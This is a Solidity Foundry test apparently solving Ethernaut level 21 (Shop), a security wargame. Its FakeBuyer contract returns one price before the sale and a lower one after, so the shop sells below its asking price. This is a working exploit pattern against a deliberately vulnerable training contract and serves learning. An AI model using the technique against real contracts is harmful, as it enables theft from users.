// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_21/Shop.sol";

contract ShopTest is Test {
    Shop public shop;
    FakeBuyer buyer;

    function setUp() public {
        shop = new Shop();
        buyer = new FakeBuyer(shop);
    }

    function testAttack() public {
        vm.prank(address(buyer));
        shop.buy();

        uint256 price = 100;
        assert(shop.price() < price);
        assert(shop.isSold());
    }
}

contract FakeBuyer {
    Shop shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 1 : 100;
    }
}
